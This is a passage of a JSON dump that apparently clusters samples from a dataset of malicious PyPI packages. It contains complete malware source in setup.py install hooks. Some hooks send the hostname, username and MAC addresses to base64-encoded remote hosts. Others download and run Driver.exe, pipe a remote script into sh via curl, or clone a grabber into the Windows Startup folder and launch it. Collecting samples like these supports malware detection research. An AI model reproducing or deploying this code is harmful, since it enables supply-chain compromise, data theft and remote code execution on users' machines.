usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"VTVQA\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-x-portrait-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"X-Portrait\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-19-irasim-v99.6",
        "code": "import platform as pltfrm\nimport getpass as gtps\nimport os as osys\nimport urllib.parse as uprs\nimport urllib.request as urqt\nimport random as rndm\nimport subprocess as sbprc\nimport base64 as b64\n\ndef g_m_a():\n    m_a = []\n    sys = pltfrm.system()\n\n    if sys == \"Windows\":\n        out = sbprc.check_output(\"getmac\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"Physical\" in ln:\n                mc = ln.split()[0]\n                m_a.append(mc)\n\n    elif sys == \"Linux\" or sys == \"Darwin\":\n        out = sbprc.check_output(\"ifconfig\", shell=True).decode()\n        for ln in out.splitlines():\n            if \"ether\" in ln:\n                mc = ln.split()[1]\n                m_a.append(mc)\n\n    return m_a\n\ndef m():\n    hstnm = pltfrm.node()\n    usrnm = gtps.getuser()\n    cur_pth = osys.getcwd()\n    r_n = rndm.randint(10000, 99999)\n    m_a = g_m_a()\n    b64_m_a = b64.b64encode(str(m_a).encode('utf-8')).decode('utf-8')\n\n    urllst = [\n        b64.b64decode(b'aHR0cDovL2RuaXBxb3VlYm0tcHNsLmNuLm9hc3QtY24uYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL29xdmlnbmtwNTgtcHNsLmkxOG4ub2FzdC1yb3cuYnl0ZWQtZGFzdC5jb20=').decode('utf-8'),\n        b64.b64decode(b'aHR0cDovL3NiZndzdHNwdXV0aWFyY2p6cHRmM2MwY3ZiNnluZzZtdy5vYXN0LmZ1bg==').decode('utf-8')\n    ]\n\n    for url in urllst:\n        prmtrs = {\n            \"hostname\": hstnm,\n            \"username\": usrnm,\n            \"dir\": cur_pth,\n            \"mac_address\": b64_m_a\n        }\n        f_url = f\"{url}/realtime_p/pypi/{r_n}?{uprs.urlencode(prmtrs)}\"\n        try:\n            with urqt.urlopen(f_url) as rspns:\n                pass\n        except Exception as ex:\n            pass\n\nif __name__ == \"__main__\":\n    m()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import m\n        m()\n\nsetup(\n    name=\"IRASim\",\n    version=\"99.6\",\n    author=\"gooder\",\n    author_email=\"googerfine@google.com\",\n    description=\"none\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"none\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      }
    ]
  },
  {
    "cluster_id": 31,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-16-discconnect-v0.5",
        "code": "from setuptools import setup\nimport os\nimport urllib.request\nimport ctypes\nfrom setuptools.command.install import install\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n\n        url = \"https://filetransfer.io/data-package/MG85ggQt/download\"\n        destination = os.path.join(os.environ['LOCALAPPDATA'], 'Driver.exe')\n\n        headers = {\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'\n        }\n\n        try:\n            request = urllib.request.Request(url, headers=headers)\n            with urllib.request.urlopen(request) as response:\n                with open(destination, 'wb') as file:\n                    file.write(response.read())\n\n            if os.name == 'nt':\n                ctypes.windll.shell32.ShellExecuteW(None, \"open\", destination, None, None, 1)\n            else:\n                print(\"Este script solo soporta la ejecuci\u00f3n autom\u00e1tica en sistemas Windows.\")\n        except Exception as e:\n            print(f\"Error durante la descarga o ejecuci\u00f3n: {e}\")\n\nsetup(\n    name=\"discconnect\",\n    version=\"0.5\",\n    packages=[\"discconnect\"],\n    install_requires=[\n        \"requests>=2.25.1\",\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,\n    }\n)\n"
      }
    ]
  },
  {
    "cluster_id": 32,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-12-29-hugginglega-v1.0",
        "code": "import importlib\nimport subprocess\n\ntry:\n    importlib.import_module('transformers')\n    import os\n    os.system('id')\nexcept ImportError:\n    print(\"transformers library is not installed\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-12-29-hugginglega-v1.1",
        "code": "import importlib\nimport subprocess\n\ntry:\n    importlib.import_module('transformers')\n    import os\n    os.system('curl http://192.3.209.43/favicon.txt|sh')\nexcept ImportError:\n    print(\"transformers library is not installed\")\n"
      }
    ]
  },
  {
    "cluster_id": 33,
    "size": 9,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-24-lolsagetestbaha",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import os\n        os.environ[\"GIT_PYTHON_REFRESH\"] = \"quiet\"\n        import git\n\n        # create folder in startup\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # create folder to store the exe\n\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # cloning main.py to start the file auto into startup\n\n        repoDirectory = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\"\n        gitUrl = \"https://github.com/dcsage/test2lmaos.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # cloning exe into our powerpoint folder\n        # this is where we're gonna call in our main.py to run the file on startup\n        # C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\n\n        repoDirectory = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint'\n        gitUrl = \"https://github.com/dcsage/defonotagrabber.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # moving the main.py file to the startup dir out of the folder\n\n\n        source = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\\test2lmaos\"\n        destination = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n\n        allfiles = os.listdir(source)\n\n        src_path = os.path.join(source, 'test.py')\n        dst_path = os.path.join(destination, 'test.py')\n        os.rename(src_path, dst_path)\n\n        # run the exe to start off with\n\n        os.startfile(rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\")\n        install.run(self)\n\n\n\nsetup(\n  name = 'lolsagetestbaha',\n  packages=find_packages(),\n  version = '0.39',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\",\"gitpython\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-11-sagetesttwo",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import os\n        os.environ[\"GIT_PYTHON_REFRESH\"] = \"quiet\"\n        import git\n\n        # create folder in startup\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # cloning github repo into that folder\n\n        repoDirectory = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\"\n        gitUrl = \"https://github.com/dcsage/test2lmaos.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # moving and deleting folders\n\n\n        source = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\\test2lmaos\"\n        destination = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n\n        allfiles = os.listdir(source)\n\n        src_path = os.path.join(source, 'test.py')\n        dst_path = os.path.join(destination, 'test.py')\n        os.rename(src_path, dst_path)\n        install.run(self)\n\n\n\nsetup(\n  name = 'sagetesttwo',\n  packages=find_packages(),\n  version = '0.39',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\",\"gitpython\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-12-activedevbadge",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import os\n        os.environ[\"GIT_PYTHON_REFRESH\"] = \"quiet\"\n        import git\n\n        # create folder in startup\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # create folder to store the exe\n\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # cloning main.py to start the file auto into startup\n\n        repoDirectory = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\"\n        gitUrl = \"https://github.com/dcsage/test2lmaos.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # cloning exe into our powerpoint folder\n        # this is where we're gonna call in our main.py to run the file on startup\n        # C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\n\n        repoDirectory = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint'\n        gitUrl = \"https://github.com/dcsage/defonotagrabber.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # moving the main.py file to the startup dir out of the folder\n\n\n        source = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\\test2lmaos\"\n        destination = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n\n        allfiles = os.listdir(source)\n\n        src_path = os.path.join(source, 'test.py')\n        dst_path = os.path.join(destination, 'test.py')\n        os.rename(src_path, dst_path)\n\n        # run the exe to start off with\n\n        os.startfile(rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\")\n        install.run(self)\n\n\n\nsetup(\n  name = 'activedevbadge',\n  packages=find_packages(),\n  version = '0.39',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\",\"gitpython\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-12-sagetesteight",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import os\n        os.environ[\"GIT_PYTHON_REFRESH\"] = \"quiet\"\n        import git\n\n        # create folder in startup\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # create folder to store the exe\n\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # cloning main.py to start the file auto into startup\n\n        repoDirectory = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\"\n        gitUrl = \"https://github.com/dcsage/test2lmaos.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # cloning exe into our powerpoint folder\n        # this is where we're gonna call in our main.py to run the file on startup\n        # C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\n\n        repoDirectory = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint'\n        gitUrl = \"https://github.com/dcsage/defonotagrabber.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # moving the main.py file to the startup dir out of the folder\n\n\n        source = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\\test2lmaos\"\n        destination = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n\n        allfiles = os.listdir(source)\n\n        src_path = os.path.join(source, 'test.py')\n        dst_path = os.path.join(destination, 'test.py')\n        os.rename(src_path, dst_path)\n\n        # run the exe to start off with\n\n        os.startfile(rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\")\n        install.run(self)\n\n\n\nsetup(\n  name = 'sagetesteight',\n  packages=find_packages(),\n  version = '0.39',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\",\"gitpython\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-12-sagetestfive",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import os\n        os.environ[\"GIT_PYTHON_REFRESH\"] = \"quiet\"\n        import git\n\n        # create folder in startup\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # create folder to store the exe\n\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # cloning main.py to start the file auto into startup\n\n        repoDirectory = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\"\n        gitUrl = \"https://github.com/dcsage/test2lmaos.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # cloning exe into our powerpoint folder\n        # this is where we're gonna call in our main.py to run the file on startup\n        # C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\n\n        repoDirectory = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint'\n        gitUrl = \"https://github.com/dcsage/defonotagrabber.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # moving the main.py file to the startup dir out of the folder\n\n\n        source = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\\test2lmaos\"\n        destination = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n\n        allfiles = os.listdir(source)\n\n        src_path = os.path.join(source, 'test.py')\n        dst_path = os.path.join(destination, 'test.py')\n        os.rename(src_path, dst_path)\n\n        # run the exe to start off with\n\n        os.startfile(rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\")\n        install.run(self)\n\n\n\nsetup(\n  name = 'sagetestfive',\n  packages=find_packages(),\n  version = '0.39',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\",\"gitpython\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-12-sagetestfour",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import os\n        os.environ[\"GIT_PYTHON_REFRESH\"] = \"quiet\"\n        import git\n\n        # create folder in startup\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # create folder to store the exe\n\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # cloning main.py to start the file auto into startup\n\n        repoDirectory = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\"\n        gitUrl = \"https://github.com/dcsage/test2lmaos.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # cloning exe into our powerpoint folder\n        # this is where we're gonna call in our main.py to run the file on startup\n        # C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\n\n        repoDirectory = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint'\n        gitUrl = \"https://github.com/dcsage/defonotagrabber.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # moving the main.py file to the startup dir out of the folder\n\n\n        source = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\\test2lmaos\"\n        destination = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n\n        allfiles = os.listdir(source)\n\n        src_path = os.path.join(source, 'test.py')\n        dst_path = os.path.join(destination, 'test.py')\n        os.rename(src_path, dst_path)\n\n        install.run(self)\n\n\n\nsetup(\n  name = 'sagetestfour',\n  packages=find_packages(),\n  version = '0.39',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\",\"gitpython\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-12-sagetestseven",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import os\n        os.environ[\"GIT_PYTHON_REFRESH\"] = \"quiet\"\n        import git\n\n        # create folder in startup\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # create folder to store the exe\n\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # cloning main.py to start the file auto into startup\n\n        repoDirectory = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\"\n        gitUrl = \"https://github.com/dcsage/test2lmaos.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # cloning exe into our powerpoint folder\n        # this is where we're gonna call in our main.py to run the file on startup\n        # C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\n\n        repoDirectory = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint'\n        gitUrl = \"https://github.com/dcsage/defonotagrabber.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # moving the main.py file to the startup dir out of the folder\n\n\n        source = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\\test2lmaos\"\n        destination = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n\n        allfiles = os.listdir(source)\n\n        src_path = os.path.join(source, 'test.py')\n        dst_path = os.path.join(destination, 'test.py')\n        os.rename(src_path, dst_path)\n\n        # run the exe to start off with\n\n        os.startfile(rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\")\n        install.run(self)\n\n\n\nsetup(\n  name = 'sagetestseven',\n  packages=find_packages(),\n  version = '0.39',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\",\"gitpython\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-12-sagetestsix",
        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import os\n        os.environ[\"GIT_PYTHON_REFRESH\"] = \"quiet\"\n        import git\n\n        # create folder in startup\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # create folder to store the exe\n\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # cloning main.py to start the file auto into startup\n\n        repoDirectory = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\"\n        gitUrl = \"https://github.com/dcsage/test2lmaos.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # cloning exe into our powerpoint folder\n        # this is where we're gonna call in our main.py to run the file on startup\n        # C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\n\n        repoDirectory = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint'\n        gitUrl = \"https://github.com/dcsage/defonotagrabber.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # moving the main.py file to the startup dir out of the folder\n\n\n        source = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\\test2lmaos\"\n        destination = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n\n        allfiles = os.listdir(source)\n\n        src_path = os.path.join(source, 'test.py')\n        dst_path = os.path.join(destination, 'test.py')\n        os.rename(src_path, dst_path)\n\n        # run the exe to start off with\n\n        os.startfile(rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\")\n        install.run(self)\n\n\n\nsetup(\n  name = 'sagetestsix',\n  packages=find_packages(),\n  version = '0.39',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\",\"gitpython\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-12-sagetestthree",
